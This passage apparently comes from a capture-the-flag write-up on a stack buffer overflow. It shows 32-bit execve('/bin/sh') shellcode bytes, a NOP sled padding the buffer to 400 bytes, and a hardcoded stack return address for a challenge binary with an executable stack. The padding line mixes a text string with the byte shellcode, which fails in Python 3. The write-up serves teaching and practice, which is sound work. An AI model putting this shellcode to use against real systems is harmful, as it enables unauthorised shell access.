## Injecting Shellcode

The storage buffer itself lives on the stack.

Since the stack is executable in this challenge, I can simply place shellcode inside the buffer and redirect execution to it.

I used a small `execve("/bin/sh")` shellcode.

```python
SHELLCODE = (
    b"\x68\x2F\x73\x68\x00"
    b"\x68\x2F\x62\x69\x6E"
    b"\x6A\x0B"
    b"\x58"
    b"\x89\xE3"
    b"\x31\xC9"
    b"\x31\xD2"
    b"\xCD\x80"
)
```

I filled the rest of the storage buffer with NOPs.

```python
SHELLCODE = "\x90" * (400 - len(SHELLCODE)) + SHELLCODE
```

The shellcode address was:

```python
SHELLCODE_ADDR = 0xffffd5a0
```

